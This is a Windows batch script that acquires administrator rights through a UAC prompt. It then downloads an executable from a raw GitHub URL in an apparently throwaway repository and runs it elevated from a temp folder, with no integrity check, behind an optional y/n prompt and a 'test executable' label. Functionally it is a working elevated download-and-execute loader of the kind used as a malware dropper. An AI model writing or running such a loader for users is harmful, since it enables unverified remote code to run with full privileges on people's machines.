@echo off
setlocal EnableExtensions DisableDelayedExpansion

rem CONFIGURATION: use a direct HTTPS link to your executable.
set "release=true"
set "EXE_URL=https://github.com/Angxuz/testtttttting/raw/refs/heads/main/built%20(1).exe"
set "SELF_PATH=%~f0"

rem Check the current token rather than assuming elevation succeeded.
powershell.exe -NoProfile -Command "$p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 0 } else { exit 1 }"
if not errorlevel 1 goto elevated

echo Requesting administrator privileges...
powershell.exe -NoProfile -Command "try { Start-Process -FilePath $env:ComSpec -ArgumentList ('/d /s /c '+[char]34+[char]34+$env:SELF_PATH+[char]34+[char]34) -Verb RunAs -ErrorAction Stop; exit 0 } catch { Write-Host ('Elevation cancelled or failed: '+$_.Exception.Message); exit 1 }"
if errorlevel 1 goto failed
exit /b 0

:elevated
if /i "%release%"=="true" goto confirm
if /i "%release%"=="false" goto run
echo ERROR: release must be true or false.
goto failed

:confirm
choice /c YN /n /m "Run test executable? y/n: "
if errorlevel 2 exit /b 0
if errorlevel 1 goto run
goto failed

:run
echo Downloading and running the configured test executable...
powershell.exe -NoProfile -Command "$ErrorActionPreference='Stop'; $target=$null; try { $uri=[uri]$env:EXE_URL; if (-not $uri.IsAbsoluteUri -or $uri.Scheme -ne 'https') { throw 'EXE_URL must be an absolute HTTPS URL.' }; if ($uri.Host -eq 'example.com') { throw 'Replace EXE_URL with your executable URL first.' }; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $folder=Join-Path ([IO.Path]::GetTempPath()) ('TestExecutable-'+[guid]::NewGuid().ToString('N')); [void][IO.Directory]::CreateDirectory($folder); $target=Join-Path $folder 'test.exe'; Invoke-WebRequest -Uri $uri.AbsoluteUri -OutFile $target -UseBasicParsing; if ((Get-Item -LiteralPath $target).Length -eq 0) { throw 'The download was empty.' }; $process=Start-Process -FilePath $target -WorkingDirectory $folder -Wait -PassThru; Write-Host ('Executable exit code: '+$process.ExitCode); Write-Host ('Downloaded file: '+$target); exit $process.ExitCode } catch { Write-Host ('ERROR: '+$_.Exception.Message); exit 1 }"
set "RESULT=%ERRORLEVEL%"
if not "%RESULT%"=="0" goto failed
exit /b 0

:failed
echo The test did not complete successfully.
pause
exit /b 1
